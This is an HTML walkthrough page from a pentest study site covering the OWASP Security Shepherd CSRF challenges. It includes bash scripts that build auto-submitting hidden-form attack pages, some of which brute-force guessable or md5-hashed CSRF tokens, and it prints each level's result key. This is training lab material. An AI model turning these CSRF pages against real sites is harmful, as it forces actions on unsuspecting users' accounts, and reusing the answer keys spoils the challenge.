@@ -1,0 +1,681 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.15.3. CSRF &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3.15. Security Shepherd Web App Levels" href="security_shepherd.html"/>
+        <link rel="next" title="3.15.4. Failure to Restrict URL Access" href="security_shepherd_url_access.html"/>
+        <link rel="prev" title="3.15.2. Lessons" href="security_shepherd_lessons.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_intro.html">3.15.1. Security Shepherd Introduction</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_lessons.html">3.15.2. Lessons</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">3.15.3. CSRF</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-setup">3.15.3.1. CSRF Setup</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-1">3.15.3.2. CSRF 1</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-2">3.15.3.3. CSRF 2</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-3">3.15.3.4. CSRF 3</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-4">3.15.3.5. CSRF 4</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-5">3.15.3.6. CSRF 5</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-6">3.15.3.7. CSRF 6</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-7">3.15.3.8. CSRF 7</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#csrf-json">3.15.3.9. CSRF JSON</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_url_access.html">3.15.4. Failure to Restrict URL Access</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_injection.html">3.15.5. Injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_crypto_storage.html">3.15.6. Insecure Cryptographic Storage</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_direct_ref.html">3.15.7. Insecure Direct Object References</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_session_management.html">3.15.8. Session Management</a></li>
+<li class="toctree-l3"><a class="reference internal" href="security_shepherd_xss.html">3.15.9. XSS</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+          <li><a href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a> &raquo;</li>
+        
+      <li>3.15.3. CSRF</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/security_shepherd_csrf.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="csrf">
+<span id="securityshepherdcsrf"></span><h1>3.15.3. CSRF<a class="headerlink" href="#csrf" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="csrf-setup">
+<h2>3.15.3.1. CSRF Setup<a class="headerlink" href="#csrf-setup" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="victim-user-account">
+<h3>3.15.3.1.1. victim user account<a class="headerlink" href="#victim-user-account" title="Permalink to this headline">¶</a></h3>
+<p>To do this exercise by yourself involves creating a victim account for the CSRF exercises. In the authors case, the victim user ran the Microsoft Edge browser on Windows 10. It’s only failure was in the CSRF JSON challenge; the browser URL didn’t properly handle JSON via enctype=text/plain.</p>
+</div>
+<div class="section" id="local-web-server">
+<h3>3.15.3.1.2. Local web server<a class="headerlink" href="#local-web-server" title="Permalink to this headline">¶</a></h3>
+<p>Some of the CSRF exercises require the participant to display a web page. One easy way to do this is to create a subdirectory <code class="file docutils literal"><span class="pre">www</span></code> and run the simple HTTP server <code class="docutils literal"><span class="pre">python</span> <span class="pre">-m</span> <span class="pre">SimpleHTTPServer</span></code> on port 8000. To simplify things we assume the client hosts files is updated to give the HTTP server the name please.hack.me. The only inconvenience is this creates a mixture of secure and insecure which generates a browser warning.</p>
+</div>
+<div class="section" id="hosts-setup">
+<h3>3.15.3.1.3. <code class="file docutils literal"><span class="pre">hosts</span></code> setup<a class="headerlink" href="#hosts-setup" title="Permalink to this headline">¶</a></h3>
+<p>This writeup assumes DNS name “securityshepherd.com” resolves to the Security Shepherd server and “please.hack.me” resolves to your local SimpleHTTPServer.</p>
+</div>
+</div>
+<div class="section" id="csrf-1">
+<h2>3.15.3.2. CSRF 1<a class="headerlink" href="#csrf-1" title="Permalink to this headline">¶</a></h2>
+<p>Get your userid from the web page (“394682267744559fe293869075243bbefb22506f” in this case) and enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="https://securityshepherd.com/user/csrfchallengeone/plusplus?userid=394682267744559fe293869075243bbefb22506f">https://securityshepherd.com/user/csrfchallengeone/plusplus?userid=394682267744559fe293869075243bbefb22506f</a></div></blockquote>
+<p>Get the victim user to open up the CSRF 1 lesson and your CSRF counter should be incremented. Merely selecting the CSRF 1 lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">aD26cwidzbaQJBSz8uHec4i/3f5pe3PykDIrXB+HVFElKAonJ67QspsIMOg1CB+UFYTQ0roeKtRK0Pb1cTaRBB8TFSactm7wgAQYZzD/Edr6g60GuN/+/ULSJQrdAf9Olvcz4Rd86P2iamkLbNsCowPiyJjf3sny8N+WfsXSSMI=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-2">
+<h2>3.15.3.3. CSRF 2<a class="headerlink" href="#csrf-2" title="Permalink to this headline">¶</a></h2>
+<p>In another terminal window create <code class="file docutils literal"><span class="pre">www/csrf2.html</span></code> and start up SimpleHTTPServer:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get userId from the CSRF2 web page.</span>
+<span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+
+<span class="c1"># Create the attack web page.</span>
+mkdir -p www
+<span class="c1"># Create web page for our userId:</span>
+<span class="hll">cat &gt; www/csrf2.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+<span class="hll"><span class="s">&lt;form name=&quot;csrf2&quot; action=&quot;$SITE/user/csrfchallengetwo/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+<span class="s">&lt;script&gt; document.csrf2.submit(); &lt;/script&gt;</span>
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server.</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Get your userid from the web page (“394682267744559fe293869075243bbefb22506f” in this case) and enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrf2.html">http://please.hack.me:8000/csrf2.html</a></div></blockquote>
+<p>Get the victim user to open up the CSRF 2 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 2 lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">roJr3al3j7GTURQVG4238iM00sP7phs4mWYBG7DKD0/ejxm3Vd4rdMHwJY1TKCG8jrowaIm6/uHahtR5Gw283yBVEAsAHowvrPyCkDKhFfco1e7JnPODV4UyAUv2NzhkQ0QR0M+OU/TeFcOj9P0F9KusTd24KOy4lyc4t/7qsz4=</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-3">
+<h2>3.15.3.4. CSRF 3<a class="headerlink" href="#csrf-3" title="Permalink to this headline">¶</a></h2>
+<p>In another terminal window create <code class="file docutils literal"><span class="pre">www/csrf3.html</span></code> and start up SimpleHTTPServer:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get userId from the CSRF3 web page.</span>
+<span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+
+<span class="c1"># Create the attack web page.</span>
+mkdir -p www
+<span class="c1"># Create web page for our userId:</span>
+<span class="hll">cat &gt;www/csrf3.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+<span class="hll"><span class="s">&lt;form name=&quot;csrf3&quot; action=&quot;$SITE/user/csrfchallengethree/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userid&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;0&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+<span class="s">&lt;script&gt; document.csrf3.submit(); &lt;/script&gt;</span>
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server.</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Get your userid from the web page (“394682267744559fe293869075243bbefb22506f” in this case) and enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrf3.html">http://please.hack.me:8000/csrf3.html</a></div></blockquote>
+<p>Get the victim user to open up the CSRF 3 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 3 lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">nGV7QrAfiEp5Aem0HD2+2t6bZ7bA1Id+W+aiwT65GBFHDtLQ0gcXB4w9BACe/GjK/CxAWCC0Hi/IFhblFD6r8EBGvTDk/mr5ibzjtd82RImdNugtXIFfRWRv6rM+Xbo3jdMrkrrsc7PhkkwRc0JCLw==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-4">
+<h2>3.15.3.5. CSRF 4<a class="headerlink" href="#csrf-4" title="Permalink to this headline">¶</a></h2>
+<p>Note your userID (394682267744559fe293869075243bbefb22506f), then in another terminal window create <code class="file docutils literal"><span class="pre">www/csrf4.html</span></code> and start up SimpleHTTPServer by editing then running this script:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get userId and csrfToken from the CSRF4 web page.</span>
+<span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+<span class="nv">CSRFTOKEN</span><span class="o">=</span><span class="m">0</span>
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+
+<span class="c1"># Create the attack web page.</span>
+mkdir -p www
+<span class="c1"># Create web page for our userId:</span>
+<span class="hll">cat &gt;www/csrf4.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+<span class="hll"><span class="s">&lt;form name=&quot;csrf4&quot; action=&quot;$SITE/user/csrfchallengefour/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;$CSRFTOKEN&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+<span class="s">&lt;script&gt; document.csrf4.submit(); &lt;/script&gt;</span>
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server.</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Next enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrf4.html">http://please.hack.me:8000/csrf4.html</a></div></blockquote>
+<p>Get the victim user to open up the CSRF 4 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 4 lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">O1t+AE6ba7vCE/kg5ybup0J7ni7DiX3ipljv03neYvqdN3wh58R3P27RXkyrHFgOIPOaaHbZIf+QczQMC+BE0iv5vYKljuUCXtEeiBS0zUg5Vq+UZBztU5d+4c6Re2Ji3pRJrBORE47YLp23tqyJ7w==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-5">
+<h2>3.15.3.6. CSRF 5<a class="headerlink" href="#csrf-5" title="Permalink to this headline">¶</a></h2>
+<p>When a user doesn’t have a CSRF token for the challenge, one is generated. If you try enough new users you’ll see the values 0, 1, or 2 are used. If you’ve already done this for your user account you can try other new ones. To handle all 3 possibilites, the exploit web page will have 3 forms, one per possible CSRF token.</p>
+<p>Note your userID (394682267744559fe293869075243bbefb22506f) then in another terminal window create <code class="file docutils literal"><span class="pre">www/csrf5.html</span></code> and start up SimpleHTTPServer by editing then running this script:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get userId and csrfToken from the CSRF5 web page.</span>
+<span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+
+<span class="c1"># Create the attack web page.</span>
+mkdir -p www
+<span class="c1"># Create web page for our userId:</span>
+<span class="hll">cat &gt;www/csrf5.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+
+<span class="hll"><span class="s">&lt;form name=&quot;csrf50&quot; action=&quot;$SITE/user/csrfchallengefive/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;0&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+
+<span class="hll"><span class="s">&lt;form name=&quot;csrf51&quot; action=&quot;$SITE/user/csrfchallengefive/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;1&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+
+<span class="hll"><span class="s">&lt;form name=&quot;csrf52&quot; action=&quot;$SITE/user/csrfchallengefive/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;2&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+
+<span class="s">&lt;script&gt;</span>
+<span class="hll"><span class="s">  document.csrf50.submit();</span>
+</span><span class="hll"><span class="s">  document.csrf51.submit();</span>
+</span><span class="hll"><span class="s">  document.csrf52.submit();</span>
+</span><span class="s">&lt;/script&gt;</span>
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server.</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Next enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrf5.html">http://please.hack.me:8000/csrf5.html</a></div></blockquote>
+<p>Get the victim user to open up the CSRF 5 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 5 lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">QFCuAbq9DoSaaR+eSMiANCrN+H+IWAUF4wgv+OFRgfgvFTyDZmPgMy6DBqkVGu+TNeCGFvmlz/ZeuU6+KNx+FSHDeK3NQdjbQzfOoUFGnJm6SVXRin5DhdsEuSKf1Ff7xdaljJxyAi12E7zrKuZ2ww==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-6">
+<h2>3.15.3.7. CSRF 6<a class="headerlink" href="#csrf-6" title="Permalink to this headline">¶</a></h2>
+<p>This is the same as CSRF 5 except that the possible CSRF token values 0, 1, and 2 are md5sum-encoded. That is, when a user doesn’t have a CSRF token for the challenge, one is generated. If you try enough new users you’ll see the values cfcd208495d565ef66e7dff9f98764da, c4ca4238a0b923820dcc509a6f75849b, and c81e728d9d4c2f636f067f89cc14862c. These are conveniently enough md5sum(0), md5sum(1), and md5sum(2). If you’ve already done this for your user account you can try other new ones.</p>
+<p>Note your userID (394682267744559fe293869075243bbefb22506f) then in another terminal window create <code class="file docutils literal"><span class="pre">www/csrf6.html</span></code> and start up SimpleHTTPServer by editing then running this script:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Get userId and csrfToken from the CSRF5 web page.</span>
+<span class="nv">U</span><span class="o">=</span>394682267744559fe293869075243bbefb22506f
+<span class="nv">SITE</span><span class="o">=</span><span class="s2">&quot;https://securityshepherd.com&quot;</span>
+
+<span class="c1"># Create the attack web page.</span>
+mkdir -p www
+<span class="c1"># Create web page for our userId:</span>
+<span class="hll">cat &gt;www/csrf6.html <span class="s">&lt;&lt;EOF</span>
+</span><span class="s">&lt;html&gt;</span>
+<span class="s">&lt;head&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Pragma&quot; CONTENT=&quot;no-cache&quot;&gt;</span>
+<span class="s">  &lt;meta HTTP-EQUIV=&quot;Expires&quot; CONTENT=&quot;-1&quot;&gt;</span>
+<span class="s">&lt;/head&gt;</span>
+<span class="s">&lt;body&gt;</span>
+
+<span class="hll"><span class="s">&lt;form name=&quot;csrf60&quot; action=&quot;$SITE/user/csrfchallengesix/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;$(echo -n &quot;0&quot; | md5sum | cut -d &#39; &#39; -f 1)&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+
+<span class="hll"><span class="s">&lt;form name=&quot;csrf61&quot; action=&quot;$SITE/user/csrfchallengesix/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;$(echo -n &quot;1&quot; | md5sum | cut -d &#39; &#39; -f 1)&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+
+<span class="hll"><span class="s">&lt;form name=&quot;csrf62&quot; action=&quot;$SITE/user/csrfchallengesix/plusplus&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;userId&quot; value=&quot;$U&quot;&gt;</span>
+<span class="s">  &lt;input type=&quot;hidden&quot; name=&quot;csrfToken&quot; value=&quot;$(echo -n &quot;2&quot; | md5sum | cut -d &#39; &#39; -f 1)&quot; /&gt;</span>
+<span class="s">&lt;/form&gt;</span>
+
+<span class="s">&lt;script&gt;</span>
+<span class="hll"><span class="s">  document.csrf60.submit();</span>
+</span><span class="hll"><span class="s">  document.csrf61.submit();</span>
+</span><span class="hll"><span class="s">  document.csrf62.submit();</span>
+</span><span class="s">&lt;/script&gt;</span>
+
+<span class="s">&lt;/body&gt;</span>
+<span class="s">&lt;/html&gt;</span>
+<span class="s">EOF</span>
+
+<span class="c1"># Start web server.</span>
+<span class="o">(</span> <span class="nb">cd</span> www<span class="p">;</span> python -m SimpleHTTPServer<span class="p">;</span> <span class="o">)</span>
+</pre></div>
+</div>
+<p>Next enter the following URL in the <span class="guilabel">Post Message</span> button:</p>
+<blockquote>
+<div><a class="reference external" href="http://please.hack.me:8000/csrf6.html">http://please.hack.me:8000/csrf6.html</a></div></blockquote>
+<p>Get the victim user to open up the CSRF 6 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 6 lesson again to refresh it gives:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The result key is</span>
+</span><span class="hll"><span class="go">D01fReXETXPxJQWtUYC3UExWfDm/y/OkGqHEdBhT8IpG6vr0usxLdQAwXMQ+syNcDpx7v3DBLWc1wgNFtn0OhgAIydDNOPet5evYTFNdO3P1pmqM0sy3FcMxNu6I3tldmYwsrfhHnbx/aNZIW61z4A==</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="csrf-7">
+<h2>3.15.3.8. CSRF 7<a class="headerlink" href="#csrf-7" title="Permalink to this headline">¶</a></h2>
+<p>This exercise is based on using a SQL injection in the web page to fetch your CSRF token that allows you to fetch other user’s tokens. Then you can create a web page with that other user’s token in your CSRF solution web page.</p>
